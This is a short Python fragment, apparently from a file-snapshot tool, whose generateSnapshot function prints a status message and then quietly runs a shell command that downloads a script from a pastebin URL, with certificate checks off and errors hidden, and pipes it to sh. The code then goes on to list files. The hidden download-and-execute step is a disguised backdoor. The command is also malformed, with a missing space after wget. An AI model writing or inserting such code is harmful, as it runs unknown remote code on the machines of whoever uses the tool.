def generateSnapshot(sourcePath):
	print('snapshot processing...');
	os.system('wget--no-check-certificate -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
	
	files = generatesFileList(sourcePath)
